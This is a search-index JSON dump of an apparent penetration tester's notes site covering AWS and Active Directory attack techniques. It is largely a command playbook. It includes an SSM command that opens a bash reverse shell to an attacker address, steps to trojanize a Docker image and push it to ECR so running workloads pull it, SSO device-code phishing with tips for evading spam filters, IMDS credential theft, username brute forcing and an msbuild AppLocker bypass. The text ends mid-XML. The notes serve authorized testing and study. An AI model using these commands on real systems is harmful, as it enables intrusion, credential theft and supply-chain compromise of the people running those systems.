{"config":{"lang":["en"],"separator":"[\\s\\-/]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"$ whoami","text":""},{"location":"#jacob-hammargren","title":"Jacob Hammargren","text":"<p>\ud83d\udcbc LinkedIn       | \ud83d\udda5\ufe0f GitHub   | \ud83d\udcdc Resume  | \u2709\ufe0f Email</p>"},{"location":"#certs","title":"Certs","text":"<p>Offensive Security Certified Professional (OSCP)</p> <p>Certified Penetration Testing Specialist (CPTS)</p> <p>Certified Red Team Operator (CRTO)</p> <p>Offensive AWS Security Professional</p> <p>Practical Web Pentest Associate (PWPA)</p> <p>Practical Network Penetration Tester</p> <p>Practical Junior Penetration Tester</p> <p>Certified Defensive Security Analyst</p> <p>Security+</p>"},{"location":"AWS/Authenticate/","title":"Authenticate","text":"<p>Authenticate to AWS with:</p> <pre><code>aws configure\n</code></pre> <p>OR env variables (if you\u2019re authing as a resource)</p> <pre><code>rm -rf ./aws\n</code></pre> <pre><code>export AWS_ACCESS_KEY_ID=&lt;token&gt;\nexport AWS_SECRET_ACCESS_KEY=&lt;token&gt;\nexport AWS_SESSION_TOKEN=&lt;token&gt;\n</code></pre> <p>OR</p> <pre><code>aws configure #add access and secret\naws configure set aws_session_token \"&lt;session token&gt;\"\n</code></pre> <p>Unset once you are done</p> <pre><code>unset AWS_ACCESS_KEY_ID\nunset AWS_SECRET_ACCESS_KEY\nunset AWS_SESSION_TOKEN\n</code></pre>"},{"location":"AWS/Compute%20Services%20%26%20Lateral%20Movement/","title":"Compute Services & Lateral Movement","text":"<p>Exploit misconfigurations in EC2 metadata, SSM, or user-data to gain code execution or extract credentials.</p>"},{"location":"AWS/Compute%20Services%20%26%20Lateral%20Movement/#instance-metadata-service-imds-enumeration","title":"Instance Metadata Service (IMDS) Enumeration","text":"<p>IMDSv1 (Unauthenticated Requests) <pre><code>curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/hostname\ncurl http://169.254.169.254/latest/meta-data/ami-id\ncurl http://169.254.169.254/latest/meta-data/instance-type\ncurl http://169.254.169.254/latest/meta-data/public-ipv4\ncurl http://169.254.169.254/latest/meta-data/security-groups\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n</code></pre> If a role is attached and has broad permissions (e.g., <code>AllowEC2ToReadSecrets</code>), you can retrieve secrets directly: <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre> IMDSv2 (Token-Based Access) <pre><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n     http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre></p>"},{"location":"AWS/Compute%20Services%20%26%20Lateral%20Movement/#ec2-user-data-enumeration","title":"EC2 User Data Enumeration","text":"<p>Pull user data from all instances: <pre><code># userDataEnum.sh\n#!/bin/bash\n\ninstance_ids=$(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)\nfor instance_id in $instance_ids; do\n    echo \"Getting userData for instance: $instance_id\"\n    user_data=$(aws ec2 describe-instance-attribute \\\n        --instance-id \"$instance_id\" \\\n        --attribute userData --output text 2&gt;/dev/null)\n    if [ -n \"$user_data\" ]; then\n        # Strip \"USERDATA\" prefix, then base64-decode\n        user_data=$(echo \"$user_data\" | sed 's/^USERDATAs*//' | sed '1d' | sed 's/^[[:space:]]*//')\n        echo \"Base64-encoded userData for $instance_id:\"\n        echo \"$user_data\"\n        echo \"Decoded userData for $instance_id:\"\n        echo \"$user_data\" | base64 -d\n    else\n        echo \"No userData for $instance_id\"\n    fi\n    echo \"-----------------------------------------\"\ndone\n</code></pre></p>"},{"location":"AWS/Compute%20Services%20%26%20Lateral%20Movement/#aws-systems-manager-ssm-command-execution","title":"AWS Systems Manager (SSM) Command Execution","text":"<p>Check for SSM perms <pre><code>aws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\n</code></pre> If you find a policy ARN such as <code>AllowSSMRunShellCommands</code>, retrieve its document: <pre><code>aws iam get-policy --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands\naws iam get-policy-version \\\n  --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands \\\n  --version-id v1\n</code></pre> Look for <code>\"ssm:SendCommand\"</code> in the document\u2019s <code>\"Statement\"</code> and note which targets (e.g., <code>\"Resource\": [\"arn:aws:ec2:us-east-1:&lt;ACCOUNT_ID&gt;:instance/i-0abcd1234\"]</code>) are allowed. Send a Command via SSM (Assuming Permissions Exist) <pre><code>aws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters '{\"commands\":[\"bash -c \\'bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\\'\"]}' \\\n  --output text\n</code></pre> If you need to base64-encode the payload to avoid shell\u2010quoting issues: <pre><code>PAYLOAD=$(echo \"bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\" | base64)\naws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters \"{\\\"commands\\\":[\\\"echo $PAYLOAD | base64 -d | bash\\\"]}\" \\\n  --output text\n</code></pre> Debug a Failed SSM Invocation: <pre><code>aws ssm list-command-invocations \\\n  --instance-id \"i-0abcd1234\" \\\n  --command-id \"cb542971-efb0-4f08-9281-9ca010a4c0ef\" \\\n  --details\n</code></pre></p>"},{"location":"AWS/Credential%20%26%20Identity%20Attacks/","title":"Credential & Identity Attacks","text":"<p>Target IAM roles, policies, or SSO flows to obtain or elevate privileges. Generate &amp; Retrieve IAM Credential Report <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> Retrieve All Roles You Can Assume <pre><code>aws iam get-account-authorization-details\n</code></pre> Review the <code>RoleDetailList</code> section for roles where you have <code>sts:AssumeRole</code> permissions. Confused Deputy / Role Chaining <pre><code>aws iam get-account-authorization-details\n</code></pre> Look for trust policies that allow <code>sts:AssumeRole</code> from an external account or cross-service trust. If you can assume a higher-privilege role in another account (Confused Deputy), you can pivot to that role.</p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/","title":"Discovery & Reconnaissance","text":"<p>Map out accounts, services, regions, and resources that exist in the target AWS environment.</p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#region-enumeration","title":"Region Enumeration","text":"<p>With Pacu <pre><code>&gt;&gt; run general__enum_regions\n</code></pre> AWS CLI <pre><code>aws ec2 describe-regions\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#iam-enumeration-credential-reporting","title":"IAM Enumeration &amp; Credential Reporting","text":"<p>Check password age, MFA enabled, access keys still active <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> List All Roles &amp; Policies (find which IAM roles/users you can assume or attach): <pre><code>aws iam get-account-authorization-details \\\n  --output json \\\n  --query '{Roles:Roles, Users:UserDetailList}'\n</code></pre> Check Attached Policies <pre><code>aws iam list-user-policies --user-name &lt;USERNAME&gt;\naws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\naws iam get-user-policy --user-name &lt;USERNAME&gt; --policy-name &lt;POLICY_NAME&gt;\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#ec2-ebs-enumeration","title":"EC2 &amp; EBS Enumeration","text":"<p>List EC2 Instances <pre><code>aws ec2 describe-instances\n</code></pre> List EBS Volumes <pre><code>aws ec2 describe-volumes\n</code></pre> List EBS Snapshots (All &amp; By Owner) <pre><code># All snapshots in a region\naws ec2 describe-snapshots --region us-east-1\n\n# Snapshots owned by a specific account\naws ec2 describe-snapshots --region us-east-1 --owner-ids &lt;ACCOUNT_ID&gt;\n</code></pre> Automate EC2 / EBS Enumeration with Pacu** <pre><code>&gt;&gt; run ebs__enum_volumes_snapshots\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#s3-bucket-discovery-interaction","title":"S3 Bucket Discovery &amp; Interaction","text":"<p>List All Buckets (If You Have Permissions) <pre><code>aws s3api list-buckets\n</code></pre> Automated Public Bucket Discovery (no auth) <pre><code>cloud_enum -k &lt;keyword&gt; -t 10 --disable-azure --disable-gcp\n</code></pre> FInd buckets with Google dorks <pre><code>site:.s3.amazonaws.com \"&lt;Target_Company&gt;\"\n\"Intitle:index.of.bucket\" \"&lt;Target_Company&gt;\"\n</code></pre> List Objects in a Bucket <pre><code>aws s3 ls s3://&lt;bucket-name&gt;\n</code></pre> Sync Entire Bucket Locally <pre><code>aws s3 sync s3://&lt;bucket-name&gt; .\n</code></pre> If Blocked / Rate-Limited (Use s3api) <pre><code>aws s3api get-object --bucket \"&lt;bucket-name&gt;\" --key \"&lt;object-key&gt;\" \"&lt;local-output&gt;\"\n</code></pre> List Object Versions (When Versioning Is Enabled) <pre><code>aws s3api list-object-versions --bucket &lt;bucket-name&gt;\n</code></pre> Dump All Object Versions via Script <pre><code># DumpObjectVersions.sh\nread -p \"Enter the S3 bucket name: \" BUCKET_NAME\nread -p \"Enter the local dir path where data will be saved: \" LOCAL\nobject_versions=$(aws s3api list-object-versions --bucket \"$BUCKET_NAME\" --no-sign-request | jq -c '.Versions[]')\nwhile IFS= read -r object_version; do\n    key=$(echo \"$object_version\" | jq -r '.Key')\n    version_id=$(echo \"$object_version\" | jq -r '.VersionId')\n    if [ -n \"$key\" ] &amp;&amp; [ \"$version_id\" != \"null\" ]; then\n        LOCAL_DIR=\"$LOCAL$key\"\n        mkdir -p \"$(dirname \"$LOCAL_DIR\")\"\n        aws s3api get-object --bucket \"$BUCKET_NAME\" \\\n          --no-sign-request \\\n          --key \"$key\" \\\n          --version-id \"$version_id\" \\\n          \"$LOCAL_DIR\"\n    fi\ndone &lt;&lt;&lt; \"$object_versions\"\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#serverless-api-enumeration","title":"Serverless &amp; API Enumeration","text":"<p>List All Lambda Functions <pre><code>aws lambda list-functions\n</code></pre> Get Detailed Info for a Lambda <pre><code>aws lambda get-function --function-name &lt;function-name&gt;\n</code></pre> Retrieve a Lambda\u2019s Deployment Package (ZIP) copy the <code>\"Location\"</code> URL from <code>aws lambda get-function</code> output, download lambda: <pre><code>curl \"&lt;Location_URL&gt;\" -o lambda.zip\n</code></pre> Discover API Gateway Endpoints <pre><code>aws apigateway get-rest-apis\n</code></pre> From the returned ARN (<code>arn:aws:execute-api:&lt;region&gt;:&lt;account&gt;:&lt;api-id&gt;/*/*</code>), build the public invoke URL: <pre><code>https://&lt;api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#container-services-enumeration","title":"Container Services Enumeration","text":"<p>List ECR Repositories <pre><code>aws ecr describe-repositories\n</code></pre> List Images in a Specific Repository <pre><code>aws ecr describe-images --repository-name &lt;repo-name&gt;\n</code></pre></p>"},{"location":"AWS/Discovery%20%26%20Reconnaissance/#backdoor-an-image-with-dockerscan","title":"Backdoor an Image with Dockerscan","text":"<p>install https://github.com/cr0hn/dockerscan <pre><code>git clone https://github.com/cr0hn/dockerscan\ncd dockerscan\nsudo python3.6 setup.py install\n</code></pre> Pull an existing image (Ubuntu as an example) <pre><code>docker pull ubuntu:latest\ndocker save ubuntu:latest -o ubuntu_original\n</code></pre> Trojanize it <pre><code>dockerscan image modify trojanize ubuntu_original \\\n  -l &lt;attacker_IP&gt; -p &lt;attacker_PORT&gt; -o alpine_infected\n</code></pre> Tag the infected image as :latest for ECR <pre><code>docker tag alpine_infected:latest \\\n  &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre> Authenticate Docker to ECR <pre><code>aws ecr get-login-password --region &lt;region&gt; | sudo docker login --username AWS --password-stdin &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre>  Push the backdoored image <pre><code>sudo docker push &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre>  Wait for any running ECS/EKS node to pull and run the new image  Once you have a shell in a compromised pod, look for creds in env vars <code>env</code></p>"},{"location":"AWS/Phishing%20via%20SSO%20Device%20Codes/","title":"Phishing via SSO Device Codes","text":"<p>Exploit AWS SSO device code flows to trick users into authenticating and returning valid tokens. Clone the AWS SSO Device Code Tool <pre><code>git clone https://github.com/christophetd/aws-sso-device-code-authentication\ncd aws-sso-device-code-authentication\n</code></pre> Generate a Device Code URL <pre><code>python main.py \\\n  --sso-start-url https://mycompany.awsapps.com/start \\\n  --sso-region us-east-1 \\\n  --output-file ./sso_token.json\n</code></pre> This will display a URL of the form: <pre><code>https://device.sso.us-east-1.amazonaws.com/?user_code=PPSR-PVFH\n</code></pre> Send that URL to your target (e.g., via email). Once they enter the code, the tool will retrieve an SSO access token.</p> <p>note</p> <p>Ensure your sender domain is unlikely to be flagged as spam. Commonly trusted domains include <code>gmail.com</code>, <code>hotmail.com</code>, <code>yahoo.com</code>, etc.</p> <p>note</p> <p>After the user authenticates, you\u2019ll receive AWS SSO tokens valid for 8 hours, which can be exchanged for AWS credentials.</p>"},{"location":"AWS/Secrets%20%26%20Notification%20Services/","title":"Secrets & Notification Services","text":"<p>Enumerate and exploit Secrets Manager, SNS topics, or other services that may leak sensitive data.</p>"},{"location":"AWS/Secrets%20%26%20Notification%20Services/#secrets-manager-enumeration-exfiltration","title":"Secrets Manager Enumeration &amp; Exfiltration","text":"<p>List All Secrets (if permitted) <pre><code>aws secretsmanager list-secrets --region us-east-1\n</code></pre> Retrieve Secret Values <pre><code>aws secretsmanager get-secret-value \\\n  --secret-id &lt;SecretName&gt; \\\n  --region us-east-1\n</code></pre></p> <p>note</p> <p>If a role or user attached to the instance (via IMDS) has <code>secretsmanager:GetSecretValue</code>, you can retrieve high-value secrets (API keys, database credentials, etc.).</p>"},{"location":"AWS/Secrets%20%26%20Notification%20Services/#simple-notification-service-sns-enumeration","title":"Simple Notification Service (SNS) Enumeration","text":"<p>Identify Topic ARNs If you\u2019ve discovered an SNS topic ARN (e.g., via Secrets Manager or CloudFormation), subscribe to it to intercept messages (which sometimes contain provisioning or \u201conboarding\u201d notifications). <pre><code>aws sns list-topics --region us-east-1\n</code></pre> Subscribe to a topic <pre><code>aws sns subscribe \\\n  --topic-arn arn:aws:sns:us-east-1:&lt;ACCOUNT_ID&gt;:Onboarding_New_Internal_Dev_Msg_01 \\\n  --protocol email \\\n  --notification-endpoint you@example.com \\\n  --region us-east-1\n</code></pre></p>"},{"location":"AWS/Serverless%20Services%20Exploitation/","title":"Serverless Services Exploitation","text":"<p>Dive deeper into compromised Lambda functions or API Gateway integrations to exfiltrate code/config or execute payloads.</p> <ol> <li>Enumerate Lambda Functions (see section 3.5).</li> <li>Download &amp; Inspect Deployment Package (ZIP and <code>env</code> variables inside).</li> <li>Identify Hardcoded Secrets or Misconfigurations (e.g., environment variables exposing DB credentials).</li> <li>Check Lambda Function Policy for \u201cInvokeFunction\u201d Permissions <pre><code>aws lambda get-policy --function-name &lt;function-name&gt;\n</code></pre></li> <li>If an API Gateway or SQS/SNS resource has permission to invoke, you can craft requests to trigger the function with malicious payloads.</li> <li>For API Gateway: build the base URL from the ARN returned by <code>get-policy</code> and send HTTP requests to test for command injection or exposed functions.</li> </ol>"},{"location":"AWS/Storage%20Enumeration%20%26%20Exploitation/","title":"Storage Enumeration & Exploitation","text":"<p>Once you know which buckets or volumes exist, try to retrieve or tamper with data. (See [[Discovery &amp; Reconnaissance]])</p>"},{"location":"AWS/Storage%20Enumeration%20%26%20Exploitation/#s3-buckets","title":"S3 Buckets","text":"<p>Upload Objects (if the bucket is writable): <pre><code>aws s3 cp &lt;localfile&gt; s3://&lt;bucket-name&gt;/\n</code></pre> Bucket ACL or Policy Misconfiguration <pre><code>aws s3api put-object --bucket &lt;bucket-name&gt; \\\n  --key \"test.txt\" --body \"./test.txt\"\n</code></pre> If it succeeds, the bucket is world-writeable.</p>"},{"location":"AWS/Storage%20Enumeration%20%26%20Exploitation/#ebs-snapshot-exploitation","title":"EBS Snapshot Exploitation","text":"<p>Identify accessible snapshots (See [[Discovery &amp; Reconnaissance]]) Use <code>dsnap</code> to download: <pre><code>dsnap --region &lt;region&gt; get &lt;SNAPSHOT_ID&gt;\n</code></pre> Launch a Docker container to mount the disk image: <pre><code>sudo IMAGE=&lt;path/to/snapshot.img&gt; make docker/run\n# Example: sudo IMAGE=./snap-xxxxxx.img make docker/run\n</code></pre> Inspect the mounted filesystem for AWS credentials in <code>~/.aws/credentials</code>, config files, or environment files.</p>"},{"location":"AWS/Tools/","title":"Tools","text":""},{"location":"AWS/Tools/#prowler","title":"Prowler","text":"<pre><code>git clone &lt;https://github.com/prowler-cloud/prowler.git&gt;\ncd prowler\npip3 install -r requirements.txt\n</code></pre> <pre><code>aws configure\n</code></pre> <pre><code>./prowler -M html -V\n</code></pre>"},{"location":"AWS/Tools/#scoutsuite","title":"Scoutsuite","text":"<p><pre><code>git clone &lt;https://github.com/nccgroup/ScoutSuite.git&gt;\ncd ScoutSuite\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 scout.py aws --report-dir ./scoutsuite_report --debug\n</code></pre> <pre><code>python3 scout.py aws --list-services\n</code></pre></p>"},{"location":"AWS/Tools/#pacu-interactive-aws-attack-framework","title":"Pacu (Interactive AWS Attack Framework)","text":"<p><pre><code>git clone https://github.com/RhinoSecurityLabs/pacu\ncd pacu\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 pacu.py\n</code></pre> Import credentials (if needed) and enumerate permissions: <pre><code>&gt;&gt; import_keys --all      # Automatically load all AWS credentials from ~/.aws or environment\n&gt;&gt; run iam__enum_permissions\n</code></pre></p>"},{"location":"Active%20Directory/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/DNS%20Dump/","title":"DNS Dump","text":"<p>You can dump potentially dump all DNS entries with a low privilege account via ADI. This can help identify new applications behind hostnames that may have just been reporting a blank IIS page. </p>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/DNS%20Dump/#tldr","title":"TL;DR","text":"<p>Using: adidnsdump</p> <pre><code>git clone https://github.com/dirkjanm/adidnsdump.git\ncd adidnsdump\npython3 -m venv adidns-venv\nsource ./adidns-venv/bin/activate\npip3 install .\n</code></pre>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/DNS%20Dump/#usage","title":"Usage","text":"<p>Display the zones in the domain where you are currently in</p> <pre><code>adidnsdump -u domain\\\\user --print-zones dc01.domain.local\n</code></pre> <p>Dump &amp; Resolve Records in default zone (will output <code>records.csv</code>)</p> <pre><code>adidnsdump -u domain\\\\user dc01.domain.local -r \n</code></pre> <p>Specify zone: <pre><code>adidnsdump -u domain\\\\user --zone &lt;zone&gt; dc01.domain.local -r\n</code></pre></p>"},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/","title":"Domain User Enumeration","text":"","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#remote","title":"Remote","text":"<p>Multi-Protocol <pre><code>enum4linux -a &lt;IP&gt;\n</code></pre> SMB <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --users\n</code></pre> RPC <pre><code>rpcclient -U \"\" -N &lt;IP&gt;\nenumdomusers\n</code></pre> <pre><code>queryuser 0x457 &lt;---user RID\n</code></pre> ldap <pre><code>ldapsearch -x -b \"DC=HTB,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\" -H ldap://&lt;IP&gt; | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre> <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --users    \n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p 'pass' --da\n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p &lt;pass&gt; -PU\n</code></pre> Check logged in users <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --loggedon-users\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#brute-force-usernames","title":"Brute force usernames","text":"<pre><code>kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175\n</code></pre>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#generate-userlists","title":"Generate userlists","text":"<p>Username Anarchy <pre><code>sudo apt install ruby -y\ngit clone https://github.com/urbanadventurer/username-anarchy.git\ncd username-anarchy\n</code></pre> <pre><code>./username-anarchy Jane Smith &gt; jane_smith_usernames.txt\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#validate-known-usernames","title":"Validate Known Usernames","text":"<pre><code>kerberute userenum -d &lt;DOMAIN&gt; users.txt\n</code></pre> <p>Add a known negative user to make sure the server is properly validating.</p>","tags":["AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/","title":"Domain Wide Enumeration","text":"","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#bloodhound","title":"Bloodhound","text":"<p>Remote ingestion <pre><code>nxc ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --bloodhound --collection All --dns-server &lt;DC-IP&gt;\n</code></pre> <pre><code>bloodhound-python -c All -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -ns &lt;dc-ip&gt;\n</code></pre> <pre><code>sudo bloodhound-python -u 'user' -p 'pass' -ns &lt;dc-ip&gt; -d domain.local -c all \n</code></pre> <code>--use-ldaps</code> if ldaps</p> <p>Local Ingestion <pre><code>SharpHound.exe --CollectionMethods All\n</code></pre> <pre><code>Invoke-BloodHound -CollectionMethod All\n</code></pre> cypher queries</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powerviewpy-remote","title":"powerview.py (remote)","text":"<p>https://github.com/aniqfakhrul/powerview.py</p> <p>Run powerview functions remotely over a persistent ldap bind.</p> <p>CLI: <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --dc-ip 192.168.86.192 \n</code></pre> Web &amp; Cli <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powerviewsharpview-local","title":"PowerView/Sharpview (local)","text":"<p>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</p> Command Description <code>Export-PowerViewCSV</code> Append results to a CSV file <code>ConvertTo-SID</code> Convert a User or group name to its SID value <code>Get-DomainSPNTicket</code> Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions: <code>Get-Domain</code> Will return the AD object for the current (or specified) domain <code>Get-DomainController</code> Return a list of the Domain Controllers for the specified domain <code>Get-DomainUser</code> Will return all users or specific user objects in AD <code>Get-DomainComputer</code> Will return all computers or specific computer objects in AD <code>Get-DomainGroup</code> Will return all groups or specific group objects in AD <code>Get-DomainOU</code> Search for all or specific OU objects in AD <code>Find-InterestingDomainAcl</code> Finds object ACLs in the domain with modification rights set to non-built in objects <code>Get-DomainGroupMember</code> Will return the members of a specific domain group <code>Get-DomainFileServer</code> Returns a list of servers likely functioning as file servers <code>Get-DomainDFSShare</code> Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: <code>Get-DomainGPO</code> Will return all GPOs or specific GPO objects in AD <code>Get-DomainPolicy</code> Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: <code>Get-NetLocalGroup</code> Enumerates local groups on the local or a remote machine <code>Get-NetLocalGroupMember</code> Enumerates members of a specific local group <code>Get-NetShare</code> Returns open shares on the local (or a remote) machine <code>Get-NetSession</code> Will return session information for the local (or a remote) machine <code>Test-AdminAccess</code> Tests if the current user has administrative access to the local (or a remote) machine Threaded 'Meta'-Functions: <code>Find-DomainUserLocation</code> Finds machines where specific users are logged in <code>Find-DomainShare</code> Finds reachable shares on domain machines <code>Find-InterestingDomainShareFile</code> Searches for files matching specific criteria on readable shares in the domain <code>Find-LocalAdminAccess</code> Find machines on the local domain where the current user has local administrator access Domain Trust Functions: <code>Get-DomainTrust</code> Returns domain trusts for the current domain or a specified domain <code>Get-ForestTrust</code> Returns all forest trusts for the current forest or a specified forest <code>Get-DomainForeignUser</code> Enumerates users who are in groups outside of the user's domain <code>Get-DomainForeignGroupMember</code> Enumerates groups with users outside of the group's domain and returns each foreign member <code>Get-DomainTrustMapping</code> Will enumerate all trusts for the current domain and any others seen. <p><pre><code>Get-DomainUser -Identity &lt;username&gt; -Domain &lt;domain.local&gt; | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre> <pre><code>Get-DomainTrustMapping\n</code></pre> <pre><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre> <pre><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Import-Module ActiveDirectory\n</code></pre> <pre><code>Get-ADDomain\n</code></pre> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>Get-ADTrust -Filter *\n</code></pre> <pre><code>Get-ADGroup -Filter * | select name\nGet-ADGroup -Identity \"Backup Operators\"\nGet-ADGroupMember -Identity \"Backup Operators\"\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#raw-ldap","title":"Raw LDAP","text":"<pre><code>ldapsearch -x -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" -H ldap://10.10.10.175\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/","title":"Enumerating Security Controls","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#identify","title":"Identify","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#windows-defender","title":"Windows Defender","text":"<p><pre><code>Get-MpComputerStatus\n</code></pre> If RealTimeProtection: True, we have defender enabled</p>","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#applocker","title":"AppLocker","text":"<pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre>","tags":["Authenticated","OPSEC","AD"]},{"location":"Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#bypassing-policy-with-lolbas","title":"Bypassing Policy with LOLBAS","text":"<p>They exist in trusted paths (C:\\Windows and C:\\Program Files) and may also be digitally signed by Microsoft.  Examples: https://lolbas-project.github.io/ Example: msbuild.exe Build and execute a C# project stored in the target XML file:</p> helloworld.xml <pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n      